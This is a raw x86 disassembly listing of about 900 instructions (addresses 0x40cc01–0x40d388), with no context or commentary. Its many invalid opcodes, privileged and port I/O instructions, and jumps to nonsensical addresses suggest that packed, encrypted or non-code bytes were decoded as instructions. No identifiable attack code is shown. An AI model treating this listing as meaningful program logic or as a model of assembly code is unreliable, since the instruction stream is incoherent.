  40cc01:	int3   
  40cc02:	add    ebp,DWORD PTR [edx+0x31]
  40cc05:	xchg   ebp,eax
  40cc06:	mov    esi,0x7ead01f3
  40cc0b:	hlt    
  40cc0c:	sahf   
  40cc0d:	jbe    0x40cc38
  40cc0f:	push   eax
  40cc10:	sahf   
  40cc11:	hlt    
  40cc12:	sub    edi,edi
  40cc14:	sbb    al,0x86
  40cc16:	sbb    al,0x8a
  40cc18:	mov    esp,0x710b0331
  40cc1d:	sbb    eax,0x312be8fe
  40cc22:	add    eax,DWORD PTR [eax]
  40cc24:	or     DWORD PTR [ebx+edi*4-0x5140cec0],esp
  40cc2b:	mulps  xmm3,xmm2
  40cc2e:	pop    edi
  40cc2f:	call   FWORD PTR [esi+0x61]
  40cc32:	jl     0x40cc04
  40cc34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc35:	lods   al,BYTE PTR ds:[esi]
  40cc36:	das    
  40cc37:	test   DWORD PTR [esi-0x22],0xea5951d3
  40cc3e:	pop    edi
  40cc3f:	(bad)  
  40cc40:	ds test al,0x7e
  40cc43:	lock or BYTE PTR ds:[esi],ah
  40cc47:	sub    DWORD PTR [eax],eax
  40cc49:	sbb    ecx,ebp
  40cc4b:	inc    edi
  40cc4c:	sub    DWORD PTR [esi],esp
  40cc4e:	mov    ah,0xe8
  40cc50:	fwait
  40cc51:	pop    ecx
  40cc52:	mov    ebp,0x551603a7
  40cc57:	stc    
  40cc58:	xor    BYTE PTR [esi],cl
  40cc5a:	pop    ds
  40cc5b:	(bad)  
  40cc5c:	scas   al,BYTE PTR es:[edi]
  40cc5d:	cmp    dh,BYTE PTR [ecx]
  40cc5f:	int    0x5f
  40cc61:	(bad)  
  40cc62:	push   ds
  40cc63:	pusha  
  40cc64:	jg     0x40cc6b
  40cc66:	pop    ss
  40cc67:	out    0x28,al
  40cc69:	pop    ebx
  40cc6a:	or     DWORD PTR [ecx-0x41],edx
  40cc6d:	mov    cl,al
  40cc6f:	call   0xd65a709c
  40cc74:	sub    dh,dl
  40cc76:	push   ds
  40cc77:	cmp    al,0xf8
  40cc79:	(bad)  
  40cc7a:	adc    BYTE PTR [ebp+0x6c90c628],al
  40cc80:	sbb    eax,esi
  40cc82:	push   ds
  40cc83:	scas   al,BYTE PTR es:[edi]
  40cc84:	test   BYTE PTR [ebp+ebp*1-0x62],dh
  40cc88:	sub    BYTE PTR [esi+0xef41509],ch
  40cc8e:	or     ecx,ebp
  40cc90:	sbb    bh,bl
  40cc92:	mov    cl,0xe7
  40cc94:	(bad)  
  40cc95:	icebp  
  40cc96:	or     BYTE PTR [esi+0x7e169d6e],al
  40cc9c:	sub    BYTE PTR [esi-0x42e41f6c],al
  40cca2:	push   eax
  40cca3:	outs   dx,BYTE PTR ds:[esi]
  40cca4:	sub    BYTE PTR [ecx],cl
  40cca6:	or     cl,ch
  40cca8:	sbb    BYTE PTR [edi+0xc7f1b1],ch
  40ccae:	icebp  
  40ccaf:	or     BYTE PTR [esi+0x6e],dl
  40ccb2:	dec    ebp
  40ccb3:	push   ss
  40ccb4:	dec    esi
  40ccb5:	sub    BYTE PTR [esi-0x6c],dl
  40ccb8:	lock sbb edx,DWORD PTR [ebp-0x4dd7c1b0]
  40ccbf:	pop    esp
  40ccc0:	add    BYTE PTR [ecx+0x1],al
  40ccc3:	push   ds
  40ccc4:	(bad)  
  40ccc5:	jmp    0xe9a8bb50
  40ccca:	xor    ch,BYTE PTR [esi]
  40cccc:	mov    esi,0x40bd3391
  40ccd1:	jmp    0x1729211f
  40ccd6:	dec    ecx
  40ccd7:	push   ds
  40ccd8:	(bad)  
  40ccd9:	jl     0x40cce5
  40ccdb:	xor    DWORD PTR es:[eax],0x59
  40ccdf:	push   ds
  40cce0:	push   0xbe2e32e8
  40cce5:	xor    ebp,0x17e940c1
  40cceb:	push   esp
  40ccec:	call   0xff5edbc7
  40ccf1:	pop    esp
  40ccf2:	frstor ds:0x1e0ea06b
  40ccf8:	(bad)  
  40ccf9:	jl     0x40cd24
  40ccfb:	push   ss
  40ccfc:	(bad)  
  40ccfd:	mov    esi,0xb69faf25
  40cd02:	push   ss
  40cd03:	push   ds
  40cd04:	mov    ch,0xc1
  40cd06:	push   es
  40cd07:	push   ds
  40cd08:	call   DWORD PTR [ecx-0x6100822e]
  40cd0e:	dec    esi
  40cd0f:	push   esp
  40cd10:	lock sahf 
  40cd12:	add    BYTE PTR [esi+0x1e],dl
  40cd15:	call   DWORD PTR [ecx+ebx*4]
  40cd18:	push   ds
  40cd19:	jne    0x40cd0c
  40cd1b:	sub    dl,BYTE PTR [ebp-0x2]
  40cd1e:	jle    0x40cd6e
  40cd20:	push   ds
  40cd21:	mov    ch,0x79
  40cd23:	dec    esi
  40cd24:	push   ds
  40cd25:	inc    DWORD PTR [ecx+0x66ff7db6]
  40cd2b:	push   ss
  40cd2c:	(bad)  
  40cd2d:	not    DWORD PTR [eax+0x25]
  40cd30:	pop    ds
  40cd31:	call   DWORD PTR [esi+0x16]
  40cd34:	xchg   esp,eax
  40cd35:	sti    
  40cd36:	inc    ecx
  40cd37:	xchg   edx,eax
  40cd38:	xchg   ecx,eax
  40cd39:	add    BYTE PTR [eax],al
  40cd3b:	pop    eax
  40cd3c:	fadd   st(1),st
  40cd3e:	or     al,0x58
  40cd40:	cmp    BYTE PTR [edx+0xb5807ec],cl
  40cd46:	call   0x3f7613
  40cd4b:	and    ecx,ecx
  40cd4d:	jae    0x40cd88
  40cd4f:	sar    cl,0x5b
  40cd52:	inc    ecx
  40cd53:	or     BYTE PTR [ecx],bh
  40cd55:	out    0xc,eax
  40cd57:	ins    BYTE PTR es:[edi],dx
  40cd58:	in     al,0xfe
  40cd5a:	push   eax
  40cd5b:	test   al,0x80
  40cd5d:	(bad)  
  40cd5e:	push   DWORD PTR [edi]
  40cd60:	mov    ds:0x45a40167,eax
  40cd65:	dec    DWORD PTR [edi+0x7]
  40cd68:	pop    edx
  40cd69:	pop    es
  40cd6a:	call   0x3fae7d
  40cd6f:	jo     0x40cdee
  40cd71:	add    BYTE PTR [eax],al
  40cd73:	mul    DWORD PTR [esi+0x4000b67]
  40cd79:	inc    esi
  40cd7a:	dec    DWORD PTR [edi-0x9]
  40cd7d:	pop    ecx
  40cd7e:	pop    es
  40cd7f:	call   0x3fae7e
  40cd84:	lock call FWORD PTR [esi-0x3e227801]
  40cd8b:	or     BYTE PTR [eax+0x1bec8a39],bl
  40cd91:	fdiv   st(3),st
  40cd93:	push   esi
  40cd94:	pop    edi
  40cd95:	jg     0x40cd96
  40cd97:	imul   esp,DWORD PTR [ebx-0x5ff78b1d],0x7ff9c1f
  40cda1:	popf   
  40cda2:	inc    esp
  40cda3:	cld    
  40cda4:	adc    ebx,DWORD PTR [ecx]
  40cda6:	cmp    DWORD PTR [eax+0x49],ecx
  40cda9:	add    eax,0x5d163d8b
  40cdae:	inc    eax
  40cdaf:	add    al,bl
  40cdb1:	and    bh,bh
  40cdb3:	push   cs
  40cdb4:	xor    DWORD PTR [esi+0x32310069],ebp
  40cdba:	fwait
  40cdbb:	cmc    
  40cdbc:	jmp    0x7714:0x59560370
  40cdc3:	add    BYTE PTR [ecx],dh
  40cdc5:	daa    
  40cdc6:	inc    ebx
  40cdc7:	je     0x40cdb0
  40cdc9:	jno    0x40cd4e
  40cdcb:	cmp    BYTE PTR [ecx],dh
  40cdcd:	adc    edi,DWORD PTR [edi-0x79]
  40cdd0:	xor    DWORD PTR [edx],esi
  40cdd2:	add    edx,DWORD PTR [eax-0x77]
  40cdd5:	cld    
  40cdd6:	leave  
  40cdd7:	inc    eax
  40cdd8:	xor    DWORD PTR [edx],ecx
  40cdda:	cwde   
  40cddb:	mov    DWORD PTR [eax],eax
  40cddd:	xor    DWORD PTR [edx],esi
  40cddf:	leave  
  40cde0:	add    dh,bl
  40cde2:	sbb    DWORD PTR [ebx],0x2512c860
  40cde8:	push   eax
  40cde9:	popa   
  40cdea:	mov    al,BYTE PTR [ebx]
  40cdec:	add    dh,bl
  40cdee:	arpl   WORD PTR [eax+eax*1+0x5003f185],bx
  40cdf5:	fidivr WORD PTR [ebx+edi*8+0x256a4ae7]
  40cdfc:	jmp    FWORD PTR [ecx-0x46]
  40cdff:	add    al,BYTE PTR [eax]
  40ce01:	(bad)  
  40ce02:	fwait
  40ce03:	fwait
  40ce04:	or     bl,BYTE PTR [ebp-0xf]
  40ce07:	add    edx,DWORD PTR [eax-0x4a]
  40ce0a:	aam    0xfb
  40ce0c:	out    0x6,eax
  40ce0e:	pop    edx
  40ce0f:	and    eax,0x851199ff
  40ce14:	call   FWORD PTR [esi-0x78983e7a]
  40ce1a:	(bad)  
  40ce1b:	ret    0xe7ff
  40ce1e:	jns    0x40ce5d
  40ce20:	mov    esi,DWORD PTR [ecx]
  40ce22:	xor    bh,al
  40ce24:	mov    edi,0xe7cd5e05
  40ce29:	sbb    cl,cl
  40ce2b:	and    al,0xff
  40ce2d:	add    DWORD PTR [ecx],ecx
  40ce2f:	mov    ecx,0x4e1b669b
  40ce34:	leavew 
  40ce36:	or     DWORD PTR [ebp+0x4dcb56c2],esi
  40ce3c:	scas   eax,DWORD PTR es:[edi]
  40ce3d:	xor    DWORD PTR ss:[edi],ecx
  40ce40:	cmp    al,0x0
  40ce42:	inc    esi
  40ce43:	sbb    esp,DWORD PTR [ecx+0x4609319b]
  40ce49:	leavew 
  40ce4b:	jge    0x260bfd13
  40ce51:	scas   eax,DWORD PTR es:[edi]
  40ce52:	cs xor ebx,edi
  40ce55:	cmp    ebx,DWORD PTR [esi]
  40ce57:	sbb    eax,DWORD PTR [ecx]
  40ce59:	or     DWORD PTR [esi+0x30190e1a],esi
  40ce5f:	ret    
  40ce60:	push   0x29606e6
  40ce65:	mov    esi,0x6b28d6fa
  40ce6a:	neg    BYTE PTR [edx]
  40ce6c:	out    dx,al
  40ce6d:	and    al,0xe3
  40ce6f:	imul   esp,DWORD PTR [ecx],0xfffffffd
  40ce72:	aaa    
  40ce73:	test   BYTE PTR [eiz*1+0xa431ade],ah
  40ce7a:	(bad)  
  40ce7b:	xchg   esp,eax
  40ce7c:	loopne 0x40ce99
  40ce7e:	repnz sbb eax,esi
  40ce81:	and    al,0x5b
  40ce83:	out    0xbd,al
  40ce85:	scas   al,BYTE PTR es:[edi]
  40ce86:	xor    DWORD PTR ss:[eax+0x25],esi
  40ce8a:	mov    dh,0x1a
  40ce8c:	inc    ebx
  40ce8d:	or     BYTE PTR [esi-0x29e40f6c],ch
  40ce93:	sbb    ebx,DWORD PTR [esi+0x34e20924]
  40ce99:	ret    
  40ce9a:	xchg   esi,eax
  40ce9b:	sbb    edx,esp
  40ce9d:	ins    DWORD PTR es:[edi],dx
  40ce9e:	stc    
  40ce9f:	(bad)  
  40cea0:	call   0x9151cac9
  40cea5:	repnz add BYTE PTR [ebp+0x1a],bh
  40cea9:	add    BYTE PTR [esi-0x66],dh
  40ceac:	jecxz  0x40cf09
  40ceae:	sub    BYTE PTR ds:0x32e901b1,dh
  40ceb4:	mov    edi,edi
  40ceb6:	aam    0x5a
  40ceb8:	and    bl,BYTE PTR [edi]
  40ceba:	push   esp
  40cebb:	or     eax,0x16d4ff1a
  40cec0:	sbb    dh,BYTE PTR [ebp-0xf]
  40cec3:	sub    bl,cl
  40cec5:	fwait
  40cec6:	ds adc eax,0xf0205dba
  40cecc:	add    al,0x0
  40cece:	xchg   esp,eax
  40cecf:	test   eax,0x822d812d
  40ced4:	adc    bh,bh
  40ced6:	push   ds
  40ced7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ced8:	(bad)  
  40ced9:	sti    
  40ceda:	mov    ecx,0xe0f944d
  40cedf:	fisttp WORD PTR ds:0x9882fe8
  40cee5:	add    dl,dh
  40cee7:	jb     0x40cef3
  40cee9:	test   DWORD PTR [ebx+0x26000930],ebp
  40ceef:	scas   eax,DWORD PTR es:[edi]
  40cef0:	adc    DWORD PTR [eax],eax
  40cef2:	jmp    0x2507d829
  40cef7:	cmp    DWORD PTR [edx],ebx
  40cef9:	pop    es
  40cefa:	jmp    0x43407e31
  40ceff:	xor    eax,0x2d52ffaf
  40cf04:	mov    WORD PTR [ebp-0x4b],es
  40cf07:	test   DWORD PTR [ebp+eax*4+0x1a1a00bd],ecx
  40cf0e:	call   FWORD PTR [ecx]
  40cf10:	push   edx
  40cf11:	xchg   esp,eax
  40cf12:	mul    DWORD PTR [esi-0x7e17e238]
  40cf18:	scas   eax,DWORD PTR es:[edi]
  40cf19:	or     BYTE PTR [eax],al
  40cf1b:	loop   0x40cf0f
  40cf1d:	xchg   esp,eax
  40cf1e:	add    al,0x80
  40cf20:	cmp    BYTE PTR [edi],al
  40cf22:	add    BYTE PTR [eax],al
  40cf24:	cwde   
  40cf25:	ins    DWORD PTR es:[edi],dx
  40cf26:	xchg   ecx,eax
  40cf27:	dec    eax
  40cf28:	dec    ecx
  40cf29:	add    eax,0xed5875ff
  40cf2e:	call   0x5026aed4
  40cf33:	mov    ebp,DWORD PTR [eax]
  40cf35:	js     0x40cebc
  40cf37:	hlt    
  40cf38:	pop    es
  40cf39:	out    0xfe,al
  40cf3b:	push   eax
  40cf3c:	call   0x88e5:0xffa1d8ed
  40cf43:	test   DWORD PTR [eax],ecx
  40cf45:	(bad)  
  40cf46:	(bad)  
  40cf47:	jmp    eax
  40cf49:	adc    eax,0x6affff9d
  40cf4e:	jmp    DWORD PTR [edi-0x33]
  40cf51:	pop    eax
  40cf52:	inc    eax
  40cf53:	add    BYTE PTR [edi-0x4e],cl
  40cf56:	out    dx,eax
  40cf57:	idiv   DWORD PTR [edi]
  40cf59:	in     al,dx
  40cf5a:	(bad)  
  40cf5b:	jne    0x40cf69
  40cf5d:	in     eax,0x31
  40cf5f:	mov    eax,ds:0x8588ec3f
  40cf64:	xor    al,0xf4
  40cf66:	(bad)  
  40cf67:	jmp    DWORD PTR [edx-0x63a997f4]
  40cf6d:	dec    ebp
  40cf6e:	(bad)  
  40cf6f:	inc    BYTE PTR [eax]
  40cf71:	and    eax,0xcffff6fd
  40cf76:	jmp    0x40cfec
  40cf78:	or     al,0x0
  40cf7a:	adc    al,0xa0
  40cf7c:	(bad)  
  40cf7d:	inc    DWORD PTR [ebp-0x1418137b]
  40cf83:	(bad)  
  40cf84:	push   0xffffffd8
  40cf86:	fs pop esi
  40cf88:	pop    esp
  40cf89:	or     DWORD PTR ds:0xf378b5ff,ecx
  40cf8f:	(bad)  
  40cf90:	(bad)  
  40cf91:	fbstp  TBYTE PTR [ecx+0xb]
  40cf94:	call   0x3f7c65
  40cf99:	and    DWORD PTR [ecx+0x7f31f7e8],eax
  40cf9f:	and    ch,BYTE PTR [edx+0x31]
  40cfa2:	or     ch,BYTE PTR [ebx+ebx*2-0x4addde10]
  40cfa9:	sbb    DWORD PTR [edi+0x1576ff21],0xc250e80f
  40cfb3:	and    edi,edi
  40cfb5:	mov    eax,0x5ef73ea5
  40cfba:	mov    bh,0x8f
  40cfbc:	test   DWORD PTR [ecx-0x49],edx
  40cfbf:	and    edi,edi
  40cfc1:	loope  0x40d00c
  40cfc3:	fwait
  40cfc4:	pop    ebx
  40cfc5:	lock and DWORD PTR [edx],esp
  40cfc8:	mov    ch,0x41
  40cfca:	fbld   TBYTE PTR [ecx]
  40cfcc:	push   DWORD PTR [esi]
  40cfce:	adc    eax,0x22704859
  40cfd3:	sub    edi,DWORD PTR [esi+0x21eed100]
  40cfd9:	or     esi,ecx
  40cfdb:	jge    0x40cfd9
  40cfdd:	adc    ah,0x1
  40cfe0:	sbb    bh,bh
  40cfe2:	push   cs
  40cfe3:	cs cwde 
  40cfe5:	clts   
  40cfe7:	push   edx
  40cfe8:	xchg   edx,eax
  40cfe9:	test   ecx,ebx
  40cfeb:	push   ds
  40cfec:	and    edi,edi
  40cfee:	popa   
  40cfef:	or     cl,BYTE PTR [esi+0x2d26ee9d]
  40cff5:	adc    al,0x3a
  40cff7:	bound  ebx,QWORD PTR [eax-0x5ec57efb]
  40cffd:	pushf  
  40cffe:	(bad)  
  40cfff:	ds dec ecx
  40d001:	test   ecx,ebp
  40d003:	ds and edi,edi
  40d006:	sbb    al,0x22
  40d008:	add    eax,DWORD PTR [eax]
  40d00a:	lods   al,BYTE PTR ds:[esi]
  40d00b:	lods   al,BYTE PTR ds:[esi]
  40d00c:	xor    esi,edi
  40d00e:	mov    dh,0x5e
  40d010:	mov    ah,0x67
  40d012:	mov    dl,0x5
  40d014:	ret    
  40d015:	jmp    DWORD PTR [edi-0x59eba3f8]
  40d01b:	pop    ss
  40d01c:	sahf   
  40d01d:	and    DWORD PTR [eax*1+0x17ae9581],ebx
  40d024:	mov    cs,WORD PTR [ebx+0x217e3cac]
  40d02a:	jle    0x40cfb7
  40d02c:	cmp    al,0x28
  40d02e:	jle    0x40d047
  40d030:	jbe    0x40d036
  40d032:	lea    edx,ds:[edx+0x4]
  40d036:	xor    DWORD PTR [ecx],ecx
  40d038:	push   0x5f
  40d03a:	add    BYTE PTR [ebp+0x1f],cl
  40d03d:	pop    esi
  40d03e:	and    DWORD PTR [ecx],esi
  40d040:	or     BYTE PTR [ebp-0x6e],ch
  40d043:	xor    DWORD PTR [ecx],ecx
  40d045:	jmp    0x3e6154ce
  40d04a:	and    DWORD PTR [esi],edi
  40d04c:	or     dh,ch
  40d04e:	xchg   DWORD PTR [eax-0x66fc16f8],esi
  40d054:	stc    
  40d055:	call   0x9c57b78a
  40d05a:	or     ecx,DWORD PTR [ecx]
  40d05c:	cmp    al,0x80
  40d05e:	and    DWORD PTR [esi],edx
  40d060:	pop    ss
  40d061:	pop    esp
  40d062:	xor    BYTE PTR [esi],al
  40d064:	pop    ss
  40d065:	push   cs
  40d066:	and    DWORD PTR [ecx+eax*1+0x11],edi
  40d06a:	jmp    0x21bc:0x20fe1698
  40d071:	(bad)  
  40d072:	and    dh,ch
  40d074:	push   ss
  40d075:	je     0x40d082
  40d077:	fyl2x  
  40d079:	and    BYTE PTR [eax],0xde
  40d07c:	push   ss
  40d07d:	xchg   esp,eax
  40d07e:	daa    
  40d07f:	ficom  WORD PTR [esi]
  40d081:	(bad)  
  40d082:	and    BYTE PTR [ecx+eax*1-0x3f],al
  40d086:	or     eax,0x20c616ab
  40d08b:	test   BYTE PTR [ecx],dh
  40d08d:	mov    dh,0x20
  40d08f:	mov    dh,0x16
  40d091:	add    BYTE PTR [edi*1+0x51509a21],bh
  40d098:	push   ss
  40d099:	call   FWORD PTR [esi+ebx*2+0x1e]
  40d09d:	call   FWORD PTR [esi+0x79c5100]
  40d0a3:	add    DWORD PTR [eax+0x70],0x54ad8eff
  40d0aa:	aam    0x7e
  40d0ac:	push   ecx
  40d0ad:	push   ss
  40d0ae:	add    ch,dh
  40d0b0:	jne    0x40d03d
  40d0b2:	mov    ebp,0xff164999
  40d0b7:	in     eax,0xbf
  40d0b9:	clc    
  40d0ba:	mov    ch,BYTE PTR [esi+eiz*1+0x1e]
  40d0be:	call   FWORD PTR [esi+0x11]
  40d0c1:	fsin   
  40d0c3:	fdivr  QWORD PTR [edx]
  40d0c5:	and    DWORD PTR [edx+0x70],ebp
  40d0c8:	adc    DWORD PTR [esi],edx
  40d0ca:	jmp    0x40d0bf
  40d0cc:	mov    WORD PTR [esi],ss
  40d0ce:	(bad)  
  40d0cf:	mov    ah,0x2a
  40d0d1:	and    DWORD PTR [esi+0x50],ebx
  40d0d4:	push   ecx
  40d0d5:	push   ss
  40d0d6:	push   DWORD PTR [esi+ecx*2+0x1e]
  40d0da:	jmp    DWORD PTR [esi]
  40d0dc:	dec    edx
  40d0dd:	imul   ebx,DWORD PTR [esi+ebx*1+0x5b51651],0x29
  40d0e5:	push   ss
  40d0e6:	inc    DWORD PTR [ecx]
  40d0e8:	mov    DWORD PTR [ebp-0x1],esi
  40d0eb:	push   es
  40d0ec:	push   ecx
  40d0ed:	pop    esp
  40d0ee:	call   0xe856e7e9
  40d0f3:	outs   dx,BYTE PTR gs:[esi]
  40d0f5:	push   ss
  40d0f6:	(bad)  
  40d0f7:	out    dx,al
  40d0f8:	jl     0x40d12f
  40d0fa:	mul    esi
  40d0fc:	and    DWORD PTR ds:[ecx-0xe9c983],eax
  40d103:	pushf  
  40d104:	add    BYTE PTR [ecx],cl
  40d106:	push   ds
  40d107:	dec    esi
  40d109:	adc    eax,0xf7009b9f
  40d10e:	cmc    
  40d10f:	(bad)  
  40d110:	mov    ch,0x78
  40d112:	std    
  40d113:	(bad)  
  40d114:	jmp    edi
  40d116:	outs   dx,DWORD PTR ds:[esi]
  40d117:	or     edi,edi
  40d119:	pop    ebp
  40d11a:	add    eax,0xf5d5b9e8
  40d11f:	(bad)  
  40d120:	(bad)  
  40d121:	std    
  40d122:	cld    
  40d123:	idiv   bh
  40d125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d126:	in     al,0x59
  40d128:	pushf  
  40d129:	mov    bh,0xf5
  40d12b:	inc    BYTE PTR [ebp-0x50]
  40d12e:	jecxz  0x40d0fc
  40d130:	std    
  40d131:	div    ebp
  40d133:	(bad)  
  40d134:	jne    0x40d11a
  40d136:	in     al,0x75
  40d138:	mov    BYTE PTR [eax+0x9],bl
  40d13b:	leave  
  40d13c:	ret    0x964
  40d13f:	push   ebp
  40d140:	mov    esp,esp
  40d142:	mov    esp,eax
  40d144:	cld    
  40d145:	jb     0x40d150
  40d147:	push   0x1c
  40d149:	imul   DWORD PTR [edi+0x7]
  40d14c:	call   0x3f65b5
  40d151:	sar    DWORD PTR [edi],0xfb
  40d154:	push   0x404996
  40d159:	push   edi
  40d15a:	xor    dh,BYTE PTR [ebp-0xf736b8]
  40d160:	jne    0x40d182
  40d162:	loope  0x40d1d5
  40d164:	std    
  40d165:	daa    
  40d166:	hlt    
  40d167:	mov    es,WORD PTR [bx+si]
  40d16a:	aam    0x4d
  40d16c:	jmp    DWORD PTR [edi+0xa]
  40d16f:	or     DWORD PTR [eax],eax
  40d171:	xor    bh,0x71
  40d174:	pop    es
  40d175:	call   0x3fbb32
  40d17a:	xlat   BYTE PTR ds:[ebx]
  40d17b:	jno    0x40d178
  40d17d:	(bad)  
  40d17e:	jge    0x40d185
  40d180:	call   0xff348304
  40d185:	leave  
  40d186:	xor    DWORD PTR [eax+0x7],esp
  40d189:	add    BYTE PTR [edi+eiz*4+0x2e],bl
  40d18d:	xor    ebp,0xb6ff1d56
  40d193:	mov    eax,0x5b4c6a03
  40d198:	cwde   
  40d199:	pop    es
  40d19a:	cdq    
  40d19b:	add    bh,BYTE PTR [ebp-0x1]
  40d19e:	sahf   
  40d19f:	cdq    
  40d1a0:	(bad)  
  40d1a1:	sti    
  40d1a2:	or     DWORD PTR [esi],ebp
  40d1a4:	add    al,0x0
  40d1a6:	xor    DWORD PTR [ebp-0x7c780879],ebp
  40d1ac:	push   ds
  40d1ad:	push   eax
  40d1ae:	mov    DWORD PTR [esi+eax*4],edx
  40d1b1:	add    BYTE PTR [ecx],dh
  40d1b3:	pop    ss
  40d1b4:	inc    ebx
  40d1b5:	je     0x40d1d4
  40d1b7:	pop    ebp
  40d1b8:	pop    es
  40d1b9:	add    DWORD PTR [ecx],esi
  40d1bb:	and    dl,BYTE PTR [esi-0x407c36dc]
  40d1c1:	inc    eax
  40d1c2:	xor    DWORD PTR [ebp-0x44b00879],esp
  40d1c8:	sbb    eax,0x7e5b5950
  40d1cd:	inc    DWORD PTR [eax]
  40d1cf:	ds jb  0x40d17d
  40d1d2:	push   DWORD PTR [esi]
  40d1d4:	ret    
  40d1d5:	pop    esp
  40d1d6:	push   eax
  40d1d7:	cs push ebp
  40d1d9:	or     ebp,eax
  40d1db:	fnstsw ax
  40d1dd:	sbb    eax,0x79c609ff
  40d1e2:	call   DWORD PTR [esi]
  40d1e4:	repz xchg edi,eax
  40d1e6:	sti    
  40d1e7:	push   cs
  40d1e8:	jne    0x40d1f5
  40d1ea:	call   0xff5e6b0d
  40d1ef:	call   0x5c40d8d3
  40d1f4:	xchg   edi,eax
  40d1f5:	cs xor ebp,0x1d
  40d1f9:	test   al,0xff
  40d1fb:	pop    eax
  40d1fc:	inc    esp
  40d1fd:	push   ds
  40d1fe:	jne    0x40d229
  40d200:	or     ecx,edx
  40d202:	pop    ecx
  40d203:	mov    ecx,0x748bde13
  40d208:	adc    eax,0x24310441
  40d20d:	(bad)  
  40d20e:	lods   al,BYTE PTR ds:[esi]
  40d20f:	xor    BYTE PTR [edi+eiz*1+0x1d494904],0xc3
  40d217:	scas   al,BYTE PTR es:[edi]
  40d218:	adc    bh,BYTE PTR [esp+ecx*1]
  40d21b:	cdq    
  40d21c:	push   0xffffffa5
  40d21e:	sbb    eax,0x201c139e
  40d223:	xchg   esi,eax
  40d224:	popf   
  40d225:	lock sub ebp,DWORD PTR [ebp+0x70]
  40d229:	xchg   esi,eax
  40d22a:	sbb    eax,0x3e54678
  40d22f:	in     al,0x7f
  40d231:	xchg   ebp,eax
  40d232:	add    DWORD PTR [eax],0x6d
  40d235:	cmp    al,0x76
  40d237:	sbb    eax,0x202c856e
  40d23c:	add    DWORD PTR [esp+esi*8],edx
  40d23f:	repz pop edi
  40d241:	popf   
  40d242:	hlt    
  40d243:	sub    ebx,ebp
  40d245:	mov    ebp,ecx
  40d247:	add    edi,DWORD PTR [edx]
  40d249:	dec    ecx
  40d24a:	out    0x86,al
  40d24c:	cmp    eax,0x7603e909
  40d251:	int    0x40
  40d253:	add    al,0x31
  40d255:	or     ecx,ebp
  40d257:	inc    esp
  40d258:	je     0x40d277
  40d25a:	ss add eax,0x3c30931
  40d260:	mov    ecx,DWORD PTR [ecx]
  40d262:	xchg   ebx,eax
  40d263:	add    ecx,DWORD PTR [ebx+0x2c76c09]
  40d269:	mov    edx,0x1afd8763
  40d26e:	push   cs
  40d26f:	sbb    eax,0x1b7c1261
  40d274:	neg    BYTE PTR [esp+edi*8+0x8a772b]
  40d27b:	jmp    0x7600d0b2
  40d280:	aaa    
  40d281:	and    BYTE PTR [edi+0x680932e8],dh
  40d287:	jnp    0x40d283
  40d289:	leave  
  40d28a:	call   ebp
  40d28c:	lahf   
  40d28d:	add    ch,al
  40d28f:	jbe    0x40d2cd
  40d291:	adc    bh,bh
  40d293:	sbb    DWORD PTR [eax+0x648d39],ebp
  40d299:	inc    esi
  40d29a:	sbb    bh,bh
  40d29c:	mov    dh,0xe2
  40d29e:	mov    eax,0x121c66e7
  40d2a3:	push   DWORD PTR [eax-0x51]
  40d2a6:	sbb    edi,esi
  40d2a8:	sahf   
  40d2a9:	sub    eax,0x2573dd21
  40d2ae:	adc    cl,BYTE PTR [ebp-0xe5ad9c]
  40d2b4:	xchg   dl,al
  40d2b6:	stos   BYTE PTR es:[edi],al
  40d2b7:	leave  
  40d2b8:	sbb    eax,0x3cfe1272
  40d2bd:	inc    edx
  40d2be:	sbb    bh,bh
  40d2c0:	outs   dx,BYTE PTR ds:[esi]
  40d2c1:	cmp    eax,0x19510b9c
  40d2c6:	je     0x40d2c7
  40d2c8:	pop    esi
  40d2c9:	mov    ebx,0x255ee48c
  40d2ce:	adc    ch,BYTE PTR [edx-0x17]
  40d2d1:	mov    dh,BYTE PTR [edi]
  40d2d3:	pop    esp
  40d2d4:	test   al,0x32
  40d2d6:	adc    dh,BYTE PTR [ebp-0xedbac7]
  40d2dc:	ss mov edi,0x9f29e7fd
  40d2e2:	adc    bh,bh
  40d2e4:	jo     0x40d295
  40d2e6:	and    al,0xf7
  40d2e8:	push   ds
  40d2e9:	sub    eax,0x3d80ff9f
  40d2ee:	mov    ch,0x40
  40d2f0:	jmp    0x1312f12
  40d2f5:	imul   ebp
  40d2f7:	(bad)  
  40d2f8:	jmp    DWORD PTR [ebp+0x2]
  40d2fb:	call   0xf5bdd3a5
  40d300:	dec    BYTE PTR [ecx-0x921ab]
  40d306:	iret   
  40d307:	(bad)  
  40d308:	jmp    DWORD PTR [edi-0x8]
  40d30b:	push   eax
  40d30c:	inc    eax
  40d30d:	add    bh,bl
  40d30f:	mov    bh,0xef
  40d311:	imul   edi
  40d313:	in     eax,dx
  40d314:	(bad)  
  40d315:	jne    0x40d2d3
  40d317:	fisttp QWORD PTR [ecx-0x77121063]
  40d31d:	test   DWORD PTR [ebp+esi*8+0xcf2fffe],edi
  40d324:	push   0xff4becee
  40d329:	(bad)  
  40d32a:	in     eax,0xfc
  40d32c:	idiv   bh
  40d32e:	lahf   
  40d32f:	in     eax,dx
  40d330:	je     0x40d33e
  40d332:	mov    al,0x5d
  40d334:	pushf  
  40d335:	jmp    FWORD PTR [edi-0x18277a7d]
  40d33b:	in     eax,dx
  40d33c:	(bad)  
  40d33d:	push   0x58
  40d33f:	pop    ebp
  40d340:	sub    DWORD PTR [ebp+0x9],ebx
  40d343:	or     eax,0xf5f8b5ff
  40d348:	(bad)  
  40d349:	(bad)  
  40d34a:	out    dx,eax
  40d34b:	ja     0x40d358
  40d34d:	call   0x3f63d6
  40d352:	rol    DWORD PTR [edi-0x1210082c],1
  40d358:	cmp    BYTE PTR [ebp-0x1038c],0x18
  40d35f:	cmp    DWORD PTR [eax-0x7d],0xf6e18d00
  40d366:	dec    DWORD PTR [edi+0x5]
  40d369:	je     0x40d3db
  40d36b:	fwait
  40d36c:	mov    dl,0xe7
  40d36e:	div    DWORD PTR [ecx]
  40d370:	neg    DWORD PTR [edx]
  40d372:	add    BYTE PTR [ebp+0x310fab87],al
  40d378:	neg    DWORD PTR [ecx-0x1]
  40d37b:	sbb    ch,BYTE PTR fs:[ebx]
  40d37e:	mov    edi,0xff1a17bf
  40d383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d384:	push   cs
  40d385:	adc    bh,bh
  40d387:	(bad)  
  40d388:	daa    
